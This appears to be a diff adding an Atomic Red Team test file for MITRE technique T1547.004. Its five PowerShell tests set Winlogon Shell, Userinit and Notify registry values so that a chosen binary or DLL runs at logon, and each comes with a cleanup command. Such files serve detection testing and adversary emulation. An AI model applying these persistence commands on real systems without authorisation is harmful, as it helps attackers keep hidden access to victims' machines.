@@ -1,0 +1,113 @@
+attack_technique: T1547.004
+display_name: 'Boot or Logon Autostart Execution: Winlogon Helper DLL'
+atomic_tests:
+
+- name: Winlogon Shell Key Persistence - PowerShell
+  auto_generated_guid: bf9f9d65-ee4d-4c3e-a843-777d04f19c38
+  description: |
+    PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.
+
+    Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.
+  supported_platforms:
+  - windows
+  input_arguments:
+    binary_to_execute:
+      description: Path of binary to execute
+      type: path
+      default: C:\Windows\System32\cmd.exe
+  executor:
+    command: |
+      Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, #{binary_to_execute}" -Force
+    cleanup_command: |
+      Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Shell" -Force -ErrorAction Ignore
+    name: powershell
+
+- name: Winlogon Userinit Key Persistence - PowerShell
+  auto_generated_guid: fb32c935-ee2e-454b-8fa3-1c46b42e8dfb
+  description: |
+    PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.
+
+    Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.
+  supported_platforms:
+  - windows
+  input_arguments:
+    binary_to_execute:
+      description: Path of binary to execute
+      type: path
+      default: C:\Windows\System32\cmd.exe
+  executor:
+    command: |
+      Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, #{binary_to_execute}" -Force
+    cleanup_command: |
+      Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Userinit" -Force -ErrorAction Ignore
+    name: powershell
+
+- name: Winlogon Notify Key Logon Persistence - PowerShell
+  auto_generated_guid: d40da266-e073-4e5a-bb8b-2b385023e5f9
+  description: |
+    PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.
+
+    Upon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon.
+
+    Please note that Winlogon Notifications have been removed as of Windows Vista / Windows Server 2008 and that this test thus only applies to erlier versions of Windows.
+  supported_platforms:
+  - windows
+  input_arguments:
+    binary_to_execute:
+      description: Path of notification package to execute
+      type: path
+      default: C:\Windows\Temp\atomicNotificationPackage.dll
+    function_to_execute:
+      description: Function in notification package to execute
+      type: string
+      default: AtomicTestFunction
+  executor:
+    command: |
+      New-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" -Force
+      Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "DllName" "#{binary_to_execute}" -Type ExpandString -Force
+      Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Logon" "#{function_to_execute}" -Force
+      Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Impersonate" 1 -Type DWord -Force
+      Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Asynchronous" 0 -Type DWord -Force
+    cleanup_command: |
+      Remove-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" -Force -ErrorAction Ignore
+    name: powershell
+
+- name: Winlogon HKLM Shell Key Persistence - PowerShell
+  auto_generated_guid: 95a3c42f-8c88-4952-ad60-13b81d929a9d
+  description: |
+    PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.
+
+    Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.
+  supported_platforms:
+  - windows
+  input_arguments:
+    binary_to_execute:
+      description: Path of binary to execute
+      type: path
+      default: C:\Windows\System32\cmd.exe
+  executor:
+    command: |
+      Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, #{binary_to_execute}" -Force
+    cleanup_command: |
+      Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Shell" -Force -ErrorAction Ignore
+    name: powershell
+
+- name: Winlogon HKLM Userinit Key Persistence - PowerShell
+  auto_generated_guid: f9b8daff-8fa7-4e6a-a1a7-7c14675a545b
+  description: |
+    PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.
+
+    Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.
+  supported_platforms:
+  - windows
+  input_arguments:
+    binary_to_execute:
+      description: Path of binary to execute
+      type: path
+      default: C:\Windows\System32\cmd.exe
+  executor:
+    command: |
+      Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, #{binary_to_execute}" -Force
+    cleanup_command: |
+      Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Userinit" -Force -ErrorAction Ignore
+    name: powershell
